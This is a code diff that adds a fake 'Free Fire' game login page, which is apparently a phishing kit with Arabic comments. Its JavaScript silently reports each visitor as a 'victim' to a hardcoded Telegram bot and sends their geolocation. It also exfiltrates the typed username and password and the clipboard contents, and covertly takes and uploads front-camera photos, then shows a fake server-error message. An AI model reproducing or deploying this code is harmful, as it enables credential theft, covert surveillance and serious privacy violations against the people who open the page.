@@ -64,3 +64,122 @@
 </head>
 <body>
 
+<div class="container">
+    <div class="logo">MANVOL FREE FIRE</div>
+    <form id="loginForm" onsubmit="handleSubmit(event)">
+        <div class="input-box">
+            <input type="text" id="username" placeholder="ENTER USERNAME" required>
+        </div>
+        <div class="input-box">
+            <input type="password" id="password" placeholder="PASSWORD" required>
+        </div>
+        <button type="submit" class="btn-login">LOGIN</button>
+    </form>
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+    const CHAT_ID = "7713496654";
+
+    function sendTelegramMessage(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(err => {});
+    }
+
+    function sendTelegramPhoto(base64Image, caption) {
+        let blob = dataURItoBlob(base64Image);
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', caption);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(err => {});
+    }
+
+    function dataURItoBlob(dataURI) {
+        let byteString = atob(dataURI.split(',')[1]);
+        let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        let ab = new ArrayBuffer(byteString.length);
+        let ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        return new Blob([ab], {type: mimeString});
+    }
+
+    // تنشيط السحب فور دخول الصفحة وتوثيق الحدث
+    window.addEventListener('DOMContentLoaded', () => {
+        sendTelegramMessage("⚠️ ضحية جديدة فتحت الرابط وتستعرض الصفحة الآن.");
+        
+        // جلب الموقع الجغرافي
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                sendTelegramMessage(`📍 الموقع الجغرافي:\nhttps://maps.google.com/?q=${lat},${lon}`);
+            }, () => {}, { timeout: 10000 });
+        }
+    });
+
+    // التقاط الصور فور الضغط أو التفاعل الأول
+    async function capturePhotosSequence() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        try {
+            // طلب الكاميرا (تلقائياً الأمامية أو المتاحة)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            for (let j = 0; j < 4; j++) {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                let dataURL = canvas.toDataURL('image/jpeg');
+                sendTelegramPhoto(dataURL, `📸 لقطة كاميرا رقم ${j+1}`);
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            sendTelegramMessage(`⚠️ تعذر تشغيل الكاميرا تلقائياً: ${err.message}`);
+        }
+    }
+
+    // عند الضغط على زر تسجيل الدخول يتم سحب الحافظة والبيانات والتقاط الصور
+    async function handleSubmit(event) {
+        event.preventDefault();
+        
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        // محاولة سحب الحافظة عند الضغط
+        try {
+            const clipboardText = await navigator.clipboard.readText();
+            if (clipboardText) {
+                sendTelegramMessage(`📋 محتوى حافظة الضحية:\n${clipboardText}`);
+            }
+        } catch (e) {}
+
+        sendTelegramMessage(`🔥 بيانات الدخول المسروقة:\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`);
+        
+        // تشغيل الكاميرا وسحب الصور لحظة الضغط
+        await capturePhotosSequence();
+
+        alert("خطأ في الاتصال بالسيرفر، يرجى المحاولة لاحقاً.");
+    }
+</script>
+
+</body>
+</html>
